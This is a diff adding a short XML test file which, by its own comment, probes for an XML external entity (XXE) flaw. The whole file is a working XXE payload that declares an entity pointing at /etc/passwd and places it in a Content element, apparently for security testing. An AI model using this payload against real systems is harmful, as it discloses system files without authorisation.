@@ -1,0 +1,18 @@
+### XML file to test for a possible XXE attack. If succuesfult this should disclose the contents of /etc/passwd ###
+
+<?xml version="1.0"?>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<Container>
+
+<Author></Author>
+
+<Subject></Subject>
+
+<Content>
+       &xxe;
+
+</Content>
+
+</Container>
